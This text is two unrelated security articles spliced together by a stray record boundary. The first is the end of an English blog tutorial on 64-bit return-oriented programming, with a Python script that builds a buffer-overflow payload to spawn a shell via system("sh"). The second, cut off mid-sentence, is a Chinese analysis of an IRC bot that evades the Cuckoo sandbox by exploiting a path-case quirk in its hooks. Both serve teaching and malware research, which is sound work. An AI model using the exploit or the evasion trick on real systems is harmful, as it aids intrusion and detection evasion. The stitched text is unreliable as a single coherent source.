\/ x86 differences\nWe are going to use the same source code again, mostly because I think\nthat in learning it's good to have as little variables changing at the\nsame time as possible so you can focus on things that really matter.\nTo know what we need to change in our 32 bit version to adopt it for\n64bit architecture, let's look again at [66]Agner's Fog paper on\ncalling conventions(page 16\/17) or at [67]wikipedia. As you can see, it\nturns out that on the newer architecture 6 arguments are passed by\nregisters(Linux) and following are pushed on the stack. I explained how\ncalling a function works in more detail in [68]part 1 of this series.\nWhat it means for us, is that we can't push argument to system()\nfunction on the stack. We need it inside register, in rdi to be exact.\nTo be able to do so, we need something called a gadget.\nGadget is just instruction or set of instructions inside the mapped\nmemory sections of the executable that will allow us to do something\nreally basic, like putting a value inside rdi.\nYou can use 'ropper' or 'rop' command inside pwndbg to find some of the\ngadgets(use it while running the binary, because if you don't, scripts\nwon't be able to find all they could)\n[69][gdb_12.png]\nGadgets found by ropper when executable is not running, as you can see\nby addresses, all of those are only inside binary code itself, and not\nfor example from dynamically loaded library.\nWe are going to use only one gadget for our purposes, pop rdi; ret;  -\non my system it's at 0x400703 (as you can see on the image above). So\nlet's see want we are trying to achieve:\n1. Stack layout (how to find address of \"sh\" and system() function\naddresses, check [70]part3):\n|JUNK| eip overwritten with 0x400703 | &\"sh\" (0x7ffff7a1fe70) |\n*system (0x7ffff7a53380) |\n2. What's going to happen:\n0x400703 \u2192 pop rdi ( we are popping \"sh\" from the stack into rdi, after\nthis operation, top of the stack points to pointer to system())\n0x400704 \u2192 ret (ret instruction takes address from top of the stack and\njumps to it)\n\u2193\n0x7ffff7a53380 \u2192 system(\"sh\")\nUsing those gadgets that very often end with ret instruction is called\nReturn Oriented Programming, this technique allows you to bypass DEP\/NX\nand run any code you like, but not in straightforward fashion but\nthrough jumping to gadgets and returning every time you want to do even\nthe simplest thing, like popping to one of the registers. Tool that I\nused to find gadgets is even capable of finding ROP-chains that gives\nyou shell, you can try that and see how well it performs(it's not\nperfect).\n9. Exploit them all!\nAgain, let's see how example of an exploit would look like:\nimport struct\ndef dq(v):\nreturn struct.pack(\"Q\", v)\nbuf = \"A\" * 1032\nbuf += dq(0x400703)  # pop rdi; ret\nbuf += dq(0x7ffff7a1fe70) # pointer to \"sh\"\nbuf += dq(0x7ffff7a53380) # system()\nwith open(\"payload\", \"wb\") as f:\nf.write(buf)\nExploit is really similar to what we have seen before. Generating\npayload with it and providing it to vulnerable binary gives us shell\nagain. Remember that we disabled ASLR for this so if you can't make it\nwork, that's probably why, also keep in mind that those addresses will\nvary across versions of libc.\n* Author [71]desconocido\nDate [72]October 23, 2016\nComments [73]No comments\n[74]Email This[75]BlogThis![76]Share to Twitter[77]Share to Facebook\n[78]\u2190 Newer Post [79]Older Post \u2192 [80]Home\n0 comments:\nPost a Comment\nSubscribe to: [81]Post Comments (Atom)\nCopyright \u00a9 [82]desc0n0cid0 | Powered by [83]Blogger\nDesign by [84]Automattic\nBlogger Theme by [85]NewBloggerThemes.com"}
{"text":"[1][logo.svg]\n* [2]\u9996\u9875\n* [3]\u6587\u7ae0\n|\u6587\u7ae0\u5206\u7c7b\n[4]\u5b89\u5168\u77e5\u8bc6| [5]\u5b89\u5168\u8d44\u8baf| [6]\u5b89\u5168\u6d3b\u52a8| [7]\u5b89\u5168\u5de5\u5177|\n[8]\u62db\u8058\u4fe1\u606f\n|\u5185\u5bb9\u7cbe\u9009\n[9]360\u7f51\u7edc\u5b89\u5168\u5468\u62a5| [10]\u5b89\u5168\u5ba2\u5b63\u520a |\n[11]\u4e13\u9898\u5217\u8868\n|\u70ed\u95e8\u6807\u7b7e\n[12]\u6d3b\u52a8 | [13]CTF | [14]\u5b89\u5168\u6d3b\u52a8 | [15]\u6076\u610f\u8f6f\u4ef6 | [16]\u6bcf\u65e5\u5b89\u5168\u70ed\u70b9 | [17]\u7f51\u7edc\u5b89\u5168\u70ed\u70b9 |\n[18]Web\u5b89\u5168 | [19]\u5b89\u5168\u5934\u6761 | [20]\u6f0f\u6d1e\u9884\u8b66 | [21]\u6f0f\u6d1e |\n* [22]SRC\u5bfc\u822a\n* [23]\u62db\u8058\n* [24]\u5185\u5bb9\u7cbe\u9009\n____________________\n\u6295\u7a3f \u6295\u7a3f\n[t01e18bc83d1362b57e.png]\n* \u4e2a\u4eba\u4e3b\u9875\n* \u6211\u7684\u6d88\u606f\n* \u4e2a\u4eba\u8bbe\u7f6e\n* \u9000\u51fa\u767b\u5f55\n* \u9996\u9875\n* \u5b89\u5168\u77e5\u8bc6\n* \u5b89\u5168\u8d44\u8baf\n* \u62db\u8058\u4fe1\u606f\n* \u5b89\u5168\u6d3b\u52a8\n* APP\u4e0b\u8f7d\n\u4e00\u4f8bIRC Bot\u9488\u5bf9Cuckoo\u6c99\u7bb1\u7684\u7325\u7410\u5bf9\u6297\u5206\u6790\n\u9605\u8bfb\u91cf    233069 | \u8bc4\u8bba 1\n\u5206\u4eab\u5230\uff1a QQ\u7a7a\u95f4 \u65b0\u6d6a\u5fae\u535a \u5fae\u4fe1 QQ facebook twitter\n\u53d1\u5e03\u65f6\u95f4\uff1a2018-07-23 15:00:13\n\u4f5c\u8005\uff1aManchurianClassmate\n\u6700\u8fd1\u6211\u4eec\u901a\u8fc7\u871c\u7f50\u6355\u83b7\u5230\u4e00\u4f8bWindows\u5e73\u53f0\u7684\u6076\u610f\u6837\u672c\uff0c\u8be5\u6837\u672c\u662f\u901a\u8fc7IRC\u670d\u52a1\u5668\u548cC2\u8fdb\u884c\u901a\u8baf\u7684\u4e00\u79cdIRC\nBot\u3002\u8fd9\u79cdC2\u901a\u8baf\u65b9\u5f0f\u7684\u6076\u610f\u7a0b\u5e8f\u5df2\u7ecf\u5c61\u89c1\u4e0d\u9c9c\uff0c\u4f46\u8fd9\u6b21\u8fd9\u4e2a\u6837\u672c\u7684\u7279\u522b\u4e4b\u5904\u5728\u4e8e\u5b83\u5305\u542b\u4e86\u975e\u5e38\u7325\u7410\u7684\u6c99\u7bb1\u5bf9\u6297\u673a\u5236\uff0c\u5f53\u6837\u672c\u6b63\u5e38\u8fd0\u884c\u7684\u65f6\u5019\u548c\u666e\u901a\u7684IRC\nBot\u5e76\u6ca1\u6709\u4ec0\u4e48-\u4e24\u6837\uff0c\u4f46\u662f\u5f53\u5c06\u5b83\u653e\u5728\u6c99\u7bb1\u91cc\u9762\u7684\u65f6\u5019\u4f1a\u53d1\u73b0\u6c99\u7bb1\u6839\u672c\u6355\u83b7\u4e0d\u5230\u4efb\u4f55\u6076\u610f\u884c\u4e3a\uff0c\u4ece\u800c\u9003\u8fc7\u68c0\u6d4b\u3002\n0x00 \u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0bCuckoo\nCuckoo\u662f\u76ee\u524d\u4f7f\u7528\u5f97\u975e\u5e38\u5e7f\u6cdb\u7684\u4e00\u79cd\u52a8\u6001\u5206\u6790\u7cfb\u7edf\uff0c\u5176\u4e3b\u8981\u529f\u80fd\u5c31\u662f\u628a\u6076\u610f\u7a0b\u5e8f\u653e\u5230Cuckoo\u7cfb\u7edf\u7684\u865a\u62df\u673a\u4e2d\uff0cCuckoo\u8d1f\u8d23\u8fd0\u884c\u8fd9\u4e9b\u6837\u672c\u7a0b\u5e8f\uff0c\n\u5e76\u8bb0\u5f55\u5b83\u4eec\u5728\u865a\u62df\u73af\u5883\u4e2d\u7684\u884c\u4e3a\uff0c\u7136\u540e\u6839\u636e\u6355\u83b7\u5230\u7684\u884c\u4e3a\u53bb\u5339\u914d\u4e00\u4e2a\u6307\u7eb9\u96c6\uff08Signature\uff09\uff0c\u8fd9\u4e2a\u6307\u7eb9\u96c6\u5185\u5b9a\u4e49\u4e86\u5f88\u591a\u6076\u610f\u7a0b\u5e8f\u7684\u7279\u5f81\u884c\u4e3a\uff0c\u6bd4\u5982\u5728\u5173\u952e\n\u7684\u4f4d\u7f6e\u5199\u5165\u6ce8\u518c\u8868\u3001\u6216\u8005\u5728\u654f\u611f\u76ee\u5f55\u6709\u8bfb\u5199\u6587\u4ef6\u7684\u884c\u4e3a\u7b49\u7b49\uff0c\u6700\u540e\u6839\u636e\u5339\u914d\u5230\u7684\u6307\u7eb9\u5bf9\u8be5\u6837\u672c\u7a0b\u5e8f\u8fdb\u884c\u6253\u5206\uff0c\u4ee5\u8bc4\u4f30\u5176\u5371\u5bb3\u7b49\u7ea7\u3002\u76f8\u6bd4\u4e8e\u9759\u6001\u6587\u4ef6\u7279\u5f81\uff0c\u884c\u4e3a\u7279\u5f81\n\u67d0\u4e9b\u60c5\u51b5\u4e0b\u66f4\u80fd\u53cd\u5e94\u771f\u5b9e\u7684\u5371\u5bb3\u60c5\u51b5\uff0c\u800c\u4e14\u5728\u6ca1\u6709\u9759\u6001\u7279\u5f81\u7684\u60c5\u51b5\u4e0b\u52a8\u6001\u7279\u5f81\u53ef\u80fd\u662f\u552f\u4e00\u53ef\u884c\u7684\u68c0\u6d4b\u65b9\u6cd5\u3002\n\u56e0\u4e3aCuckoo\u662f\u5f00\u6e90\u4ea7\u54c1\uff0c\u6240\u4ee5\u88ab\u5e94\u7528\u5f97\u975e\u5e38\u5e7f\u6cdb\uff0c\u4e5f\u96be\u514d\u4f1a\u6709\u6076\u610f\u7a0b\u5e8f\u4e13\u95e8\u9488\u5bf9Cuckoo\u8bbe\u8ba1\u5bf9\u6297\u673a\u5236\u3002\n0x01 \u901a\u5e38\u60c5\u51b5\u4e0b\u5982\u4f55\u5bf9\u6297\u6c99\u7bb1\n\u9488\u5bf9\u865a\u62df\u673a\n\u56e0\u4e3a\u53cd\u75c5\u6bd2\u6c99\u7bb1\u5927\u591a\u90fd\u662f\u57fa\u4e8e\u865a\u62df\u673a\u7684\uff0c\u6240\u4ee5\u5982\u679c\u80fd\u4fdd\u8bc1\u6837\u672c\u5728\u865a\u62df\u673a\u73af\u5883\u4e2d\u4e0d\u6267\u884c\u90a3\u4e48\u5c31\u80fd\u5927\u6982\u7387\u4fdd\u8bc1\u5176\u5728\u6c99\u7bb1\u4e2d\u4e0d\u6267\u884c\uff0c\u9488\u5bf9\u6c99\u7bb1\u7684\u68c0\u6d4b\u4e3b\u8981\u6709\u5982\u4e0b\u51e0\u7c7b\uff1a1\n\uff09\u865a\u62df\u673a\u7684\u7279\u6b8a\u8fdb\u7a0b\/\u6ce8\u518c\u8868\u4fe1\u606f\uff0c\u6bd4\u5982\u50cfVBoxTray.exe\u3001VMwareTray.exe\u7b49\uff1b2\uff09\u7279\u6b8a\u7684\u9a71\u52a8\u7a0b\u5e8f\uff0c\u6bd4\u5982Virtualbox\u6216\nVMware\u5728Guest\u673a\u5668\u91cc\u9762\u5b89\u88c5\u7684\u9a71\u52a8\uff1b3\uff09\u786c\u4ef6\u4fe1\u606f\uff0c\u6bd4\u5982\u7f51\u5361\u7684mac\u5730\u5740\uff0c\u7279\u5b9a\u54c1\u724c\u865a\u62df\u673a\u7684\u7f51\u5361mac\u5730\u5740\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5927\u591a\u90fd\u5728\u4e00\u4e2a\u7279\u5b9a\u8303\u56f4\u5185\n\uff1b4\uff09\u6307\u4ee4\u6267\u884c\u73af\u5883\uff0c\u6bd4\u5982\u50cfLDT\u3001GDT\u7684\u5730\u5740\u8303\u56f4\u7b49\u7b49\u3002\n\u9488\u5bf9\u68c0\u6d4b\u65f6\u95f4\n\u6c99\u7bb1\u6bcf\u4e00\u8f6e\u5206\u6790\u4e00\u4e2a\u6837\u672c\u7684\u65f6\u95f4\u662f\u6709\u9650\u7684\uff0c\u901a\u5e38\u5c31\u51e0\u5206\u949f\uff0c\u6240\u4ee5\u5982\u679c\u80fd\u8ba9\u6837\u672c\u5728\u8fd9\u51e0\u5206\u949f\u5185\u4e0d\u8fdb\u5165\u4efb\u4f55\u6838\u5fc3\u903b\u8f91\u90a3\u4e48\u5c31\u53ef\u4ee5\u907f\u514d\u88ab\u68c0\u6d4b\u5230\u3002\u901a\u5e38\u91c7\u53d6\u7684\u505a\u6cd5\u6709\uff1a1\n\uff09\u5229\u7528Sleep\u51fd\u6570\uff0c\u6216\u548cSleep\u540c\u7b49\u529f\u80fd\u7684\u5ef6\u65f6\u51fd\u6570\uff1b2\uff09\u68c0\u6d4b\u7cfb\u7edf\u65f6\u95f4\uff0c\u901a\u8fc7\u7cfb\u7edf\u7684\u65f6\u95f4\u6765\u5ef6\u65f6\uff1b3\uff09\u8fd0\u884c\u4e00\u4e9b\u975e\u5e38\u8017\u65f6\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u4e00\u4e9b\u7279\u6b8a\u7684\u6570\u5b66\n\u7b97\u6cd5\u4ee5\u8fbe\u5230\u6d88\u8017\u65f6\u95f4\u7684\u76ee\u7684\u3002\n\u9488\u5bf9\u4ea4\u4e92\n\u8fd9\u79cd\u505a\u6cd5\u662f\u4e3a\u4e86\u786e\u4fdd\u6837\u672c\u662f\u5728\u6709\u4eba\u64cd\u4f5c\u7684\u8ba1\u7b97\u673a\u4e2d\u542f\u52a8\u7684\uff0c\u6bd4\u5982\u53ef\u4ee5\u68c0\u6d4b\u9f20\u6807\u7684\u79fb\u52a8\u3001\u6545\u610f\u5f39\u7a97\u8ba9\u7528\u6237\u70b9\u51fb\u7b49\u7b49\u3002\n\u66f4\u8be6\u7ec6\u7684\u4e00\u4e9b\u5bf9\u6297\u59ff\u52bf\u53ef\u4ee5\u53c2\u8003\u7f51\u4e0a\u7684\u4e00\u4e9b\u6587\u7ae0\uff1a[25]https:\/\/www.52pojie.cn\/thread-377352-1-1.html\n0x02 \u8fd9\u4e2a\u6837\u672c\u662f\u600e\u4e48\u505a\u7684\n\u800c\u672c\u6587\u6d89\u53ca\u7684\u8fd9\u4e2a\u6837\u672c\u7684\u6c99\u7bb1\u5bf9\u6297\u65b9\u5f0f\u548c\u4ee5\u5f80\u5df2\u77e5\u7684\u65b9\u5f0f\u90fd\u4e0d\u4e00\u6837\u3002\u8fd9\u4e2a\u5728\u871c\u7f50\u4e2d\u88ab\u53d1\u73b0\u7684\u6837\u672c\u5728Cuckoo\u4e2d\u68c0\u6d4b\u7684\u5206\u6570\u53ea\u67093\u5206\uff0c\u4e5f\u5c31\u662f\u5728\u4e00\u4e2a\u4f4e\u5371\u5bb3\u7b49\u7ea7\n\u4e0a\uff0c\u548c\u5f88\u591a\u7684\u6b63\u5e38\u7a0b\u5e8f\u7684\u5206\u503c\u76f8\u5f53\u3002\n[t01fc30c819f51e9cff.png]\n\u800c\u4e14Cuckoo\u4e5f\u6ca1\u6709\u68c0\u6d4b\u5230\u8be5\u6837\u672c\u5b58\u5728\u7f51\u7edc\u884c\u4e3a\u6216\u5176\u4ed6\u654f\u611f\u884c\u4e3a\u3002\u4f46\u662f\u5f53\u6211\u4eec\u624b\u52a8\u5728\u865a\u62df\u673a\u5185\u8fd0\u884c\u8be5\u6837\u672c\u65f6\u53d1\u73b0\u8be5\u6837\u672c\u662f\u5b58\u5728\u7f51\u7edc\u884c\u4e3a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u8be5\u6837\u672c\u5728\n\u6c99\u7bb1\u4e2d\u6ca1\u6709\u6267\u884c\u5b83\u771f\u6b63\u7684\u4e1a\u52a1\u903b\u8f91\u3002\u9996\u5148\u6765\u68b3\u7406\u4e00\u4e0b\u8fd9\u4e2a\u6837\u672c\u5728\u6267\u884c\u4e1a\u52a1\u903b\u8f91\u4e4b\u524d\u7684\u6d41\u7a0b\uff1a\n\u8ba9\u6211\u4eec\u6bd4\u8f83\u611f\u5174\u8da3\u7684\u662f\u62f7\u8d1d\u81ea\u8eab\u7136\u540e\u91cd\u8d77\u65b0\u8fdb\u7a0b\u7684\u8fc7\u7a0b\uff1a [t01fc30c819f51e9cff.png]\n\u9996\u5148\u662f\u8c03\u7528GetModuleFileNameA\u83b7\u53d6\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5b8c\u6574\u8def\u5f84\u3002\n[t01fc30c819f51e9cff.png]\n\u7136\u540e\u53c8\u8c03\u7528\u4e86GetSystemDirectoryA\u6765\u83b7\u53d6\u7cfb\u7edf\u76ee\u5f55\uff08C:\\\\Windows\\system32\uff09\uff0c\u7136\u540e\u6bd4\u5bf9\u662f\u5224\u65ad\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u662f\u5426\n\u5728\u7cfb\u7edf\u76ee\u5f55\u4e0b\uff0c\u5982\u679c\u4e0d\u5728\u7cfb\u7edf\u76ee\u5f55\u4e0b\u5219\u590d\u5236\u81ea\u8eab\u5230\u7cfb\u7edf\u76ee\u5f55\uff0c\u542f\u52a8\u65b0\u6587\u4ef6\uff0c\u81ea\u8eab\u9000\u51fa\u3002\u5f53\u65b0\u8fdb\u7a0b\u542f\u52a8\uff0c\u8fd9\u4e2a\u5224\u65ad\u5f53\u524d\u8def\u5f84\u7684\u903b\u8f91\u5c31\u4f1a\u8d70\u5411\u53e6\u4e00\u4e2a\u5206\u652f\uff0c\u5f00\u59cb\u771f\u6b63\u7684\n\u6838\u5fc3\u4e1a\u52a1\u903b\u8f91\uff0c\u6bd4\u5982\u53d1\u9001\u4e0a\u7ebf\u5305\uff1a\n[t01fc30c819f51e9cff.png]\n\u5728\u865a\u62df\u673a\u4e2d\u8fd0\u884c\u65f6\u5b9e\u9645\u884c\u4e3a\u4e5f\u662f\u5982\u6b64\uff0c\u5728\u7b2c\u4e00\u6b21\u8fd0\u884c\u540e\u590d\u5236\u81ea\u8eab\u521b\u5efa\u65b0\u8fdb\u7a0b\uff0c\u5f00\u59cb\u6267\u884c\u4e1a\u52a1\u903b\u8f91\uff0c\u4f46\u5728\u6c99\u7bb1\u4e2d\u6355\u83b7\u5230\u884c\u4e3a\u5c31\u6709\u70b9\u4e0d\u4e00\u6837\u4e86\uff1a\n[t01fc30c819f51e9cff.png]\n\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b\u4e5f\u662f\u5e72\u4e86\u548c\u7236\u8fdb\u7a0b\u4e00\u6837\u7684\u4e8b\u60c5\uff0c\u7136\u540e\u9000\u51fa\u3002\u5e76\u6ca1\u6709\u8fd0\u884c\u540e\u9762\u7684\u6838\u5fc3\u4e1a\u52a1\u903b\u8f91\uff0c\u81ea\u7136\u6c99\u7bb1\u6355\u83b7\u4e0d\u5230\u540e\u7eed\u7684\u6076\u610f\u884c\u4e3a\u3002\n0x03 \u7ec6\u8282\u539f\u7406\n\u4e3a\u5565\u76f8\u540c\u7684\u4ee3\u7801\u5728\u4e0d\u540c\u7684\u73af\u5883\u4e2d\u4f1a\u6709\u5b8c\u5168\u4e0d\u540c\u7684\u6267\u884c\u903b\u8f91\u5462\uff0c\u770b\u4e00\u4e0b\u5b9e\u9645\u8c03\u8bd5\u7684\u60c5\u51b5\u5c31\u4f1a\u53d1\u73b0\u8fd0\u884c\u5230strstr\u51fd\u6570\u65f6\u53c2\u6570\u91cc\u9762\u6709\u4e00\u4e9b\u732b\u817b\uff1a\n[t01fc30c819f51e9cff.png]\n\u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u5224\u65ad\u7cfb\u7edf\u76ee\u5f55\u662f\u5426\u662f\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\u7684\u5b50\u4e32\u3002\u5f53\u524d\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\u91cc\u9762System32\u7684S\u662f\u5927\u5199\u7684\uff0c\u800c\u901a\u8fc7GetSystemDirec\ntoryA\u83b7\u53d6\u5230\u7684system32\u7684s\u662f\u5c0f\u5199\u7684\uff0c\u8fd9\u6837\u5373\u4f7f\u5f53\u524d\u6837\u672c\u662f\u5b58\u5728\u4e8e\u7cfb\u7edf\u76ee\u5f55\u4e0b\uff0c\u6bd4\u5bf9\u7ed3\u679c\u4e5f\u662f\u5426\uff0c\u4ece\u800c\u65e0\u6cd5\u8fdb\u5165\u6838\u5fc3\u903b\u8f91\u3002\u56e0\u4e3aWindows\u7cfb\n\u7edf\u4e0d\u533a\u5206\u6587\u4ef6\u8def\u5f84\u7684\u5927\u5c0f\u5199\uff0c\u6240\u4ee5System32\u548csystem32\u90fd\u662f\u6709\u6548\u8def\u5f84\u3002\u4f46\u662fWindows\n\u7684\u4e0d\u540cAPI\u5bf9\u4e8e\u8def\u5f84\u5927\u5c0f\u5199\u7684\u5904\u7406\u7b56\u7565\u5e76\u4e0d\u7edf\u4e00\uff0c\u6700\u5751\u7684\u662f\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\u91cc\u9762\u5e76\u6ca1\u6709\u5bf9\u8fd9\u4e9b\u7ec6\u8282\u7684\u63cf\u8ff0\u3002GetSystemDirectoryA\u51fd\u6570\u59cb\u7ec8\u4f1a\n\u8fd4\u56de\u5c0f\u5199\u7684system32\uff0c\u4f46\u662fGetModuleFileNameA\u8fd4\u56de\u503c\u5219\u53d6\u51b3\u4e8e\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\u901a\u8fc7\u8d44\u6e90\u7ba1\u7406\u5668\u542f\u52a8\u65f6\u662f\u5927\u5199\u7684Sy\nstem32\uff0c\u4f46\u901a\u8fc7CreateProcess\u51fd\u6570\u542f\u52a8\u7684\u8bdd\u5982\u679c\u547d\u4ee4\u884c\u662f\u5c0f\u5199\u5219\u83b7\u53d6\u5230\u7684\u8def\u5f84\u4e5f\u662f\u5c0f\u5199\u3002\n\u5728\u8fd9\u4e2a\u6837\u672c\u7684\u4f8b\u5b50\u91cc\u9762\u6bcd\u4f53\u901a\u8fc7CreateProcess\u542f\u52a8\u65b0\u8fdb\u7a0b\u7684\u65f6\u5019\u4f20\u5165\u7684\u662f\u5c0f\u5199\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u5728\u6b63\u5e38\u8fd0\u884c\u7684\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u6bd4\u5bf9\u8def\u5f84\u7684strstr\u51fd\n\u6570\u6ca1\u6709\u4efb\u4f55\u95ee\u9898\uff0c\u4f46\u662f\u5728\u6c99\u7bb1\u4e2d\u8fd9\u4e2astrstr\u7684\u53c2\u6570\u91cc\u9762\u5176\u4e2d\u4e00\u4e2a\u7684system32\u7684s\u53d8\u6210\u4e86\u5927\u5199\uff0c\u4ece\u800c\u5bfc\u81f4\u4e86\u8fd0\u884c\u903b\u8f91\u7684\u4e0d\u540c\u3002\n\u4e3a\u5565\u5728\u6c99\u7bb1\u91cc\u9762\u8fd9\u4e2asystem32\u7684s\u5c31\u53d8\u6210\u5927\u5199\u4e86\u5462\uff1f\u5228\u4e00\u4e0bCuckoo\u7684\u4ee3\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u771f\u6b63\u7684\u539f\u56e0\u4e86\u3002\u9996\u5148\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0bCuckoo\u7684\u5de5\u4f5c\u539f\u7406\uff0c\nCuckoo\u5bf9\u6837\u672c\u884c\u4e3a\u7684\u6355\u83b7\u4f9d\u9760API Inline\nHook\uff0c\u88ab\u6d4b\u6837\u672c\u4f1a\u88ab\u6ce8\u5165\u52a0\u8f7d\u4e00\u4e2a\u76d1\u63a7\u6a21\u5757\uff0c\u5f53\u6837\u672c\u8c03\u7528\u67d0\u4e2aAPI\u51fd\u6570\u65f6\u4f1a\u88ab\u52ab\u6301\u5230Cuckoo\u7684\u6a21\u5757\u5185\uff0c\u8fd9\u4e2a\u6a21\u5757\u9664\u4e86\u5e38\u89c4\u7684\u505alog\u64cd\u4f5c\u7136\u540e\u8fd4\u56de\u539f\n\u51fd\u6570\u5916\u8fd8\u4f1a\u5bf9\u67d0\u4e9bAPI\u7684\u4e0a\u4e0b\u6587\u8fdb\u884c\u7be1\u6539\uff0c\u76ee\u7684\u5728\u4e8e\u52ab\u6301\u67d0\u4e9bAPI\u7684\u6267\u884c\u903b\u8f91\u3002\n\u672c\u6b21\u6848\u4f8b\u7684\u573a\u666f\u5c31\u662f\u5982\u6b64\uff0c\u5f53\u6076\u610f\u6837\u672c\u91ca\u653e\u4e86\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u5e76\u521b\u5efa\u65b0\u8fdb\u7a0b\u65f6Cuckoo\u9700\u8981\u628a\u76d1\u63a7\u6a21\u5757\u653e\u5165\u65b0\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u624d\u80fd\u7ee7\u7eed\u6355\u83b7\u65b0\u8fdb\u7a0b\u7684\u884c\u4e3a\u3002\u4e8e\n\u662f\u5bf9\u4e8eCreateProcess\u7b49\u76f8\u5173API\u6709\u5fc5\u8981\u5728hook\u4e2d\u52a0\u5165\u989d\u5916\u903b\u8f91\uff0cCuckoo\u5728CreateProcessInternalW\u7684hoo\nk\u4e2d\u52a0\u5165\u4e86\u5982\u4e0b\u7684\u4e00\u4e9b\u903b\u8f91\uff1a\n[t01fc30c819f51e9cff.png]\n\u76d1\u63a7\u6a21\u5757\u4f1a\u628a\u65b0\u52a0\u5165\u7684\u4ee3\u7801\u4f1a\u628a\u65b0\u521b\u5efa\u7684\u8fdb\u7a0b\u7684pid\u901a\u8fc7\u4e00\u4e2a\u547d\u540d\u7ba1\u9053\u4f20\u7ed9Cuckoo\u5e76\u4e14\u628a\u65b0\u8fdb\u7a0b\u6302\u8d77\uff0cCuckoo\u518d\u5411\u65b0\u521b\u5efa\u7684\u8fdb\u7a0b\u6ce8\u5165\u76d1\u63a7\u6a21\u5757\u5e76\u89e3\n\u9664\u6302\u8d77\uff1a\n[t01fc30c819f51e9cff.png]\n\u5728\u5bf9CreateProcessInternalW\u7684hook\u4e2dCuckoo\u7684\u76d1\u63a7\u6a21\u5757\u4f1a\u8c03\u7528path_get_full_pathw\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\nCuckoo\nMonitor\u7684src\/misc.c\u4e2d\u6709\u5b9a\u4e49\uff08[26]https:\/\/github.com\/cuckoosandbox\/monitor\/blo\nb\/master\/src\/misc.c#L503\uff09\uff1a [t01fc30c819f51e9cff.png]\n[t01fc30c819f51e9cff.png]\n\u5176\u4e2d\u53c8\u8c03\u7528\u4e86GetLongPathW\u8fd9\u4e2aAPI\uff0c\u800c\u8fd9\u4e2aAPI\u7684\u7279\u6027\u6070\u597d\u662f\u6c38\u8fdc\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5927\u5199\u7684\u8def\u5f84\uff08\u4e5f\u5c31\u662fSystem32\uff09\u3002\u4ece\u800c\u5728\u6c99\u7bb1\u4e2d\u867d\u7136\u901a\n\u8fc7CreateProcessA\u4f20\u5165\u4e86\u5c0f\u5199\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4f46\u7ecf\u8fc7Cuckoo\u8fd9\u4e48\u4e00\u5904\u7406\uff0c\u53c2\u6570\u4e2d\u7684\u8def\u5f84\u5c31\u53c8\u53d8\u6210\u5927\u5199\u7684\u4e86\uff0c\u8fd9\u6837\u4e00\u6765\u5bf9\u4e8e\u8fd9\u4e2a\u6837\u672c\u800c\u8a00\u90a3\u4e2a\n\u5bf9\u6267\u884c\u8def\u5f84\u7684\u5224\u65ad\u5c31\u662f\u4e00\u4e2a\u6c38\u5047\u7684\u7ed3\u679c\uff0c\u81ea\u7136\u5728\u6c99\u7bb1\u4e2d\u5c31\u8d70\u4e0d\u5230\u540e\u7eed\u7684\u6838\u5fc3\u903b\u8f91\u91cc\u9762\u53bb\uff1a\n[t01fc30c819f51e9cff.png]\n\u5982\u6b64\u4e00\u6765\u9760\u4e00\u4e2aAPI\u5728\u6709hook\u548c\u6ca1\u6709hook\u7684\u60c5\u51b5\u4e0b\u4e0d\u540c\u7684\u884c\u4e3a\u8868\u73b0\u6765\u8ba9\u6837\u672c\u5728\u6c99\u7bb1\u4e2d\u6709\u53e6\u5916\u4e00\u5957\u884c\u4e3a\u903b\u8f91\uff0c\u4ece\u800c\u9003\u907f\u68c0\u6d4b\u3002\n0x04 \u7ed3\u8bba\n\u4ee5\u5f80\u7684\u5f88\u591a\u6837\u672c\u7528\u6765\u5bf9\u6297\u6c99\u7bb1\u91c7\u53d6\u7684\u65b9\u5f0f\u90fd\u662f\u68c0\u6d4b\u786c\u4ef6\u4fe1\u606f\uff0c\u4ee5\u6b64\u6765\u5224\u65ad\u662f\u5426\u662f\u5728\u865a\u62df\u673a\u4e2d\u8fd0\u884c\uff0c\u6bd4\u5982\u5224\u65ad\u662f\u5426\u6709Vmware\u3001VirtualBox\u7684\u9a71\u52a8\u6a21\n\u5757\uff0c\u6216\u8005\u786c\u76d8\u5927\u5c0f\uff0c\u4ea6\u6216\u8005IDT\u3001LDT\u3001GDT\u6240\u5728\u7684\u5730\u5740\u8303\u56f4\u7b49\u3002\u800c\u672c\u4f8b\u6240\u5229\u7528\u7684\u7279\u5f81\u662f\u67d0\u4e9bAPI\u5728\u6c99\u7bb1\u4e2d\u6240\u8868\u73b0\u51fa\u7684\u4e0d\u540c\u4e8e\u6b63\u5e38\u73af\u5883\u7684\u884c\u4e3a\uff0c\u5f53\u901a\u8fc7C\nreateProcess\u521b\u5efa\u8fdb\u7a0b\u65f6\uff0c\u547d\u4ee4\u884c\u4e2d\u7684\u8def\u5f84\u7684\u5927\u5c0f\u5199\u4f1a\u88ab\u6c99\u7bb1\u7684hook\u66ff\u6362\u6389\u3002\u67d0\u79cd\u610f\u4e49\u4e0a\u6765\u8bf4\u8fd9\u4e5f\u7b97\u662f\u4e00\u79cd\u65b0\u9896\u7684\u68c0\u6d4b\u65b9\u5f0f\uff0c\u540c\u65f6\u4e5f\u66b4\u9732\u4e86\u53cd\u75c5\n\u6bd2\u6c99\u7bb1\u53ef\u80fd\u5b58\u5728\u7684\u53e6\u4e00\u7c7b\u